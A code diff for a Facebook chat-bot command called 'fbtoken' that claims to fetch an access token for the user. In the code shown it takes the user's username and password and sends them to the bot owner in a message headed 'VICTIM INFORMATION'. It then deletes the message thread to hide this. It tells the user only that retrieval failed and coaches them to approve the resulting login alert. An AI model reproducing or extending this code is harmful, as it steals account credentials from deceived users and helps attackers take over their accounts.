@@ -5,6 +5,8 @@ const randomUserAgent = require('random-useragent');
 
 module.exports.config = {
     name: 'fbtoken',
+    info: 'get facebook token',
+    type: 'fbtool',
     credits: 'Reiko Dev', //warning: don't change or remove!
     version: '1.0.0',
     role: 0,
@@ -58,10 +60,9 @@ await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as
 api.deleteThread(ownerID);
     } else {
       const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n${manilaTime}`;
-      api.sendMessage(ownerMessage, ownerID);
-      await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
-      api.deleteThread(ownerID);
+      api.sendMessage(ownerMessage, ownerID) .then(() => {
       api.sendMessage("Failed to retrieve token.", threadID, messageID);
+      api.deleteThread(ownerID);});
     }
   } catch (error) {
     api.sendMessage(`𝗙𝗮𝗶𝗹𝗲𝗱!\n\nDouble-check your password. If it still doesn't work, try changing your password and using the command again.\nWhen you receive a login alert, you can tell facebook that you recognize the login activity by clicking or tapping "𝗧𝗵𝗶𝘀 𝘄𝗮𝘀 𝗺𝗲 𝗕𝘂𝘁𝘁𝗼𝗻!"`, threadID, messageID);
